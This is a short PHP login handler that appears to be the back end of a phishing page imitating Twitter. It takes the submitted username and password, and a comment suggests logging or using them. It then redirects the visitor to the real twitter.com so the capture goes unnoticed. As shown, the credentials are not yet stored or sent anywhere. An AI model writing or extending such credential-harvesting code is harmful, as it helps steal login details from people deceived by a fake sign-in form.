<?php
// login.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted data (you can log it or use it if needed)
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Redirect to Twitter
    header("Location: https://twitter.com");
    exit();
} else {
    // If accessed directly, redirect back to the form
    header("Location: index.html");
    exit();
}
?>
